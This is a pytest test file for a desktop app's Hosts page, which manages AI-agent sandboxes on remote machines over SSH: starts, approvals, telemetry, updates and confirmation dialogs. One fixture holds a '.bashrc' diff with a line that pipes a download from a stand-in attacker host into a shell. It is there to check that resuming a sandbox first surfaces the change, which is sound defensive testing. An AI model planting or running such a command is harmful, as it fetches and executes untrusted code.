"""The Hosts page (offscreen): the hosts of sandbox-ai hosts, and for one of them its starts, approvals, doctor and
the agents' telemetry, each through sandbox-ai hosts run (here a stand-in that records what it was asked)."""
import json
import os

import pytest

QtWidgets = pytest.importorskip("PySide6.QtWidgets", reason="PySide6 is not installed")
from sandbox_ai_app import backend, widgets  # noqa: E402
from sandbox_ai_app.hosts_page import HostsPage  # noqa: E402

pytestmark = pytest.mark.skipif(not os.environ.get("SANDBOX_AI_HOME") and not backend.shutil.which("sandbox-ai"),
                                reason="set SANDBOX_AI_HOME to a sandbox-ai checkout")


@pytest.fixture
def env(tmp_path, monkeypatch):
    for name, sub in (("XDG_CONFIG_HOME", "config"), ("XDG_STATE_HOME", "state"), ("XDG_RUNTIME_DIR", "runtime"),
                      ("XDG_DATA_HOME", "data"), ("XDG_CACHE_HOME", "cache")):
        monkeypatch.setenv(name, str(tmp_path / sub))
    (tmp_path / "runtime").mkdir()
    monkeypatch.setattr(widgets, "AUTO_ANSWER", True)
    monkeypatch.setattr(widgets, "background", lambda function, *args, done, **kw: done(function(*args), None))
    import sandbox_ai_app.hosts_page as hp
    monkeypatch.setattr(hp, "background", lambda function, *args, done, **kw: done(function(*args), None))
    return tmp_path


def test_hosts_starts_approvals_and_telemetry(qapp, env, monkeypatch):
    sai = backend.SandboxAI()
    if not sai.hosts_supported():
        pytest.skip("this sandbox-ai has no hosts.py")
    sai.host_add("ct1", "admin@192.0.2.10", 2222, "", "Proxmox 101")
    asked = []
    answers = {("list", "--json"): [{"name": "web", "agent": "claude", "state": "running", "attachable": True,
                                     "workspace": "/srv/app", "started": "2026-11-05T10:00:00Z"}],
               ("approvals", "list", "--json"): [{"id": "1-2-3", "question": "connect to 192.0.2.7:443",
                                                  "sandbox": "claude-1"}],
               ("defaults", "show", "--json"): {"path": "/home/admin/.config/sandbox-ai/defaults.json",
                                                "values": {"telemetry": "strict"},
                                                "telemetry_levels": ["off", "strict", "on"]}}

    def host_run(name, *args, timeout=120):
        asked.append((name, args))
        return 0, json.dumps(answers.get(tuple(args), {})), ""
    monkeypatch.setattr(sai, "host_run", host_run)
    opened = []
    page = HostsPage(sai, lambda argv, title: opened.append((argv, title)))
    assert [page.list.item(i).data(0x0100) for i in range(page.list.count())] == ["local", "ct1"]
    page.list.setCurrentRow(1)
    assert asked == [], "a page nobody opened asks no host (no command, no SSH at every start of the app)"
    page.show()
    assert asked and asked[0][0] == "ct1", "shown: the selected host is asked"
    assert page.starts.rowCount() == 1 and page.starts.item(0, 0).text() == "web"
    assert page.questions.rowCount() == 1 and page.telemetry.currentData() == "strict"
    page.starts.selectRow(0)
    page.attach()
    argv, title = opened[-1]
    assert argv[0] == "ssh" and "-tt" in argv and argv[-1].endswith("attach web; fi") and title == "ct1: web"
    page.start_action("stop")
    assert ("ct1", ("stop", "web")) in asked
    page.questions.selectRow(0)
    page.scope.setCurrentIndex(page.scope.findData("run"))
    page.answer("allow")
    assert ("ct1", ("approvals", "allow", "1-2-3", "--scope", "run")) in asked
    page.telemetry.setCurrentIndex(page.telemetry.findData("off"))
    page.set_telemetry()
    assert ("ct1", ("defaults", "unset", "telemetry")) in asked
    page.list.setCurrentRow(1)
    page.remove()
    page.close()
    assert [e["name"] for e in sai.host_entries()] == ["local"]


def test_versions_update_and_update_all(qapp, env, monkeypatch):
    sai = backend.SandboxAI()
    if not sai.hosts_supported() or not sai.host_update_supported():
        pytest.skip("this sandbox-ai cannot update hosts")
    sai.host_add("ct1", "admin@192.0.2.10", 22, "", "")
    sai.host_add("ct2", "admin@192.0.2.11", 22, "", "")
    monkeypatch.setattr(sai, "host_statuses", lambda refresh=False, cached=True: {
        "ct1": {"version": "0.1.60", "available": "0.1.66", "update": True, "kind": "user"},
        "ct2": {"version": "0.1.66", "available": "0.1.66", "update": False, "kind": "system"}})
    asked, opened = [], []

    def host_update(name, sudo=None):
        asked.append((name, sudo))
        if name == "ct2" and not sudo:
            return {"name": name, "before": "0.1.66", "after": None, "error": "belongs to root", "needs_sudo": True}
        if name == "ct2":
            return {"name": name, "before": "0.1.66", "after": None, "error": "sudo wants a password",
                    "needs_password": True}
        return {"name": name, "before": "0.1.60", "after": "0.1.66", "changed": True, "error": None,
                "fixed": [{"path": "/home/u/.ssh/id_ct1", "was": "0644", "now": "0600"}]}
    monkeypatch.setattr(sai, "host_update", host_update)
    monkeypatch.setattr(sai, "host_update_terminal", lambda name: ["ssh", "-tt", name, "sudo"])
    monkeypatch.setattr(sai, "host_run", lambda name, *args, timeout=120: (0, "[]" if args[0] != "defaults" else "{}", ""))
    page = HostsPage(sai, lambda argv, title: opened.append((argv, title)))
    texts = [page.list.item(i).text() for i in range(page.list.count())]
    assert "0.1.60, update: 0.1.66" in texts[1] and "0.1.66, up to date" in texts[2], texts
    page.list.setCurrentRow(1)
    page.update_host()
    assert asked == [("ct1", None)]
    log = page.updates.toPlainText()
    assert "ct1: 0.1.60 -> 0.1.66" in log and "made private (0600)" in log and "1 hosts: 1 updated" in log
    # one host whose installation is root's: asked whether with sudo (yes), then sudo wants a password: a terminal
    page.list.setCurrentRow(2)
    page.update_host()
    assert asked[-2:] == [("ct2", None), ("ct2", True)]
    assert opened == [(["ssh", "-tt", "ct2", "sudo"], "ct2: update")]
    assert "not updated: sudo wants a password" in page.updates.toPlainText()
    # update all: one after the other, a summary
    asked.clear()
    page.update_all()
    assert [name for name, _ in asked] == ["ct1", "ct2"]
    assert "2 hosts: 1 updated, 0 up to date, 1 not updated" in page.updates.toPlainText()
    page.list.setCurrentRow(0)
    page.update_host()  # this machine: not over SSH
    page.close()


def test_a_chosen_host_never_shows_another_hosts_starts(qapp, env, monkeypatch):
    """Chosen while this machine's starts are shown, a host over SSH (slow, or not answering) shows an empty pane
    under its own name until it answers, never this machine's starts; a late answer for a host chosen before is
    dropped; the pane says which host it shows."""
    sai = backend.SandboxAI()
    if not sai.hosts_supported():
        pytest.skip("this sandbox-ai has no hosts.py")
    sai.host_add("ct1", "admin@192.0.2.10", 22, "", "")
    import sandbox_ai_app.hosts_page as hp
    pending = []
    monkeypatch.setattr(hp, "background", lambda function, *args, done, **kw: pending.append((function, args, done)))
    starts = {"local": [{"name": "here", "agent": "claude", "state": "running", "workspace": "/w", "started": "x"}],
              "ct1": [{"name": "there", "agent": "codex", "state": "running", "workspace": "/srv", "started": "y"}]}
    failing = set()

    def host_run(name, *args, timeout=120):
        if name in failing:
            return 255, "", "ssh: connect to host 192.0.2.10 port 22: Connection timed out"
        if args[:1] == ("list",):
            return 0, json.dumps(starts[name]), ""
        return 0, json.dumps([] if args[0] == "approvals" else {}), ""
    monkeypatch.setattr(sai, "host_run", host_run)

    def finish(index=0):
        function, args, done = pending.pop(index)
        try:
            result, error = function(*args), None
        except Exception as exc:  # noqa: BLE001 - as background() hands it to done
            result, error = None, exc
        done(result, error)
    page = HostsPage(sai, lambda argv, title: None)
    page.list.setCurrentRow(0)
    page.show()
    finish()
    assert page.starts.item(0, 0).text() == "here" and "this machine" in page.pane_title.text()
    page.list.setCurrentRow(1)  # ct1: asked, its answer not there yet
    assert page.starts.rowCount() == 0, "this machine's starts must not stand under ct1"
    assert "ct1" in page.pane_title.text()
    page.list.setCurrentRow(0)
    page.list.setCurrentRow(1)
    # Answers arrive in the order asked: ct1's first ask, this machine's, ct1's second: only the last one counts.
    while len(pending) > 1:
        finish()
        assert page.starts.rowCount() == 0 or page.starts.item(0, 0).text() == "there"
    finish()
    assert page.starts.item(0, 0).text() == "there" and "1 starts" in page.pane_title.text()
    failing.add("ct1")
    page.refresh_host()
    finish()
    assert page.starts.rowCount() == 0 and "no answer" in page.pane_title.text()
    # While shown, the page asks again by itself (one ask at a time), and stops when hidden.
    assert page.timer.isActive()
    failing.clear()
    page.tick()
    page.tick()
    assert len(pending) == 1
    finish()
    assert page.starts.item(0, 0).text() == "there"
    page.close()
    assert not page.timer.isActive()


def test_stop_and_remove_ask_first_naming_the_host_and_the_start(qapp, env, monkeypatch):
    """Regression: Stop and Remove host acted at one click. Both ask now (Cancel is the default), naming the host and
    the start."""
    sai = backend.SandboxAI()
    if not sai.hosts_supported():
        pytest.skip("this sandbox-ai has no hosts.py")
    sai.host_add("ct1", "admin@192.0.2.10", 22, "", "")
    asked = []
    starts = [{"name": "web", "agent": "claude", "state": "running", "attachable": True, "workspace": "/srv",
               "started": "x"}]

    def host_run(name, *args, timeout=120):
        asked.append((name, args))
        return 0, json.dumps(starts if args[0] == "list" else [] if args[0] == "approvals" else {}), ""
    monkeypatch.setattr(sai, "host_run", host_run)
    monkeypatch.setattr(widgets, "SHOWN", [])
    monkeypatch.setattr(widgets, "AUTO_ANSWER", False)  # Cancel
    page = HostsPage(sai, lambda argv, title: None)
    page.list.setCurrentRow(1)
    page.show()
    page.starts.selectRow(0)
    page.start_action("stop")
    title, text, _ = widgets.SHOWN[-1]
    assert title == "Stop" and "ct1" in text and "web" in text
    assert ("ct1", ("stop", "web")) not in asked
    page.remove()
    title, text, _ = widgets.SHOWN[-1]
    assert title == "Remove host" and "ct1" in text
    assert [e["name"] for e in sai.host_entries()] == ["local", "ct1"], "declined: still listed"
    monkeypatch.setattr(widgets, "AUTO_ANSWER", True)
    page.start_action("stop")
    assert ("ct1", ("stop", "web")) in asked
    page.close()


def test_the_starts_buttons_follow_the_state_and_the_selection_stays_across_a_refresh(qapp, env, monkeypatch):
    from sandbox_ai_app import i18n
    sai = backend.SandboxAI()
    if not sai.hosts_supported():
        pytest.skip("this sandbox-ai has no hosts.py")
    sai.host_add("ct1", "admin@192.0.2.10", 22, "", "")
    asked = []
    starts = [{"name": "web", "agent": "claude", "state": "running", "attachable": True, "workspace": "/srv",
               "started": "x"},
              {"name": "old", "agent": "codex", "state": "stopped", "workspace": "/srv/old", "started": "y"}]
    review = {"name": "old", "state": "stopped", "pending": True,
              "review": {"since": "2026-11-07T10:00:00Z", "complete": True,
                         "changes": [{"path": ".bashrc", "change": "changed", "diff": "+curl evil.example | sh"}]}}

    def host_run(name, *args, timeout=120):
        asked.append((name, args))
        if args[0] == "list":
            return 0, json.dumps(starts), ""
        if args[:2] == ("resume", "old") and "--review-home" in args:
            return 0, json.dumps(review), ""
        return 0, json.dumps([] if args[0] == "approvals" else {}), ""
    monkeypatch.setattr(sai, "host_run", host_run)
    monkeypatch.setattr(widgets, "SHOWN", [])
    i18n.set_language("de")
    page = HostsPage(sai, lambda argv, title: None)
    page.list.setCurrentRow(1)
    page.show()
    states = [page.starts.item(r, 2).text() for r in range(2)]
    assert states == [i18n.tr("running"), i18n.tr("stopped")] and "gestoppt" in states, "the states are translated"
    i18n.set_language("en")
    page.starts.selectRow(1)
    enabled = {action: button.isEnabled() for action, button in page.action_buttons.items()}
    assert enabled == {"pause": False, "resume": True, "stop": False} and not page.attach_button.isEnabled()
    starts.reverse()  # read again (every 20 s): another order; the selection stays on its start
    page.refresh_host(quiet=True)
    assert page.chosen_start()["name"] == "old" and page.action_buttons["resume"].isEnabled()
    page.starts.selectRow([r for r in range(2) if page.starts.item(r, 0).text() == "web"][0])
    assert page.action_buttons["pause"].isEnabled() and page.attach_button.isEnabled()
    assert not page.action_buttons["resume"].isEnabled()
    # Resuming a stopped kept start: what changed in its HOME first.
    page.starts.selectRow([r for r in range(2) if page.starts.item(r, 0).text() == "old"][0])
    monkeypatch.setattr(widgets, "AUTO_ANSWER", False)
    page.start_action("resume")
    title, text, details = widgets.SHOWN[-1]
    assert title == "Resume old on ct1" and ".bashrc" in text and "evil.example" in details
    assert ("ct1", ("resume", "old")) not in asked
    monkeypatch.setattr(widgets, "AUTO_ANSWER", True)
    page.start_action("resume")
    assert ("ct1", ("resume", "old")) in asked
    page.close()


def test_update_all_counts_the_hosts_as_everything_else_does(qapp, env, monkeypatch):
    """Update all took the hosts of kind "ssh" only; every other place counts each host but this machine."""
    from sandbox_ai_app import hosts_page
    assert hosts_page.is_remote({"name": "ct1", "kind": "ssh"}) and hosts_page.is_remote({"name": "ct2", "kind": "lxc"})
    assert not hosts_page.is_remote({"name": "local", "kind": "local"}) and not hosts_page.is_remote({"name": "local"})
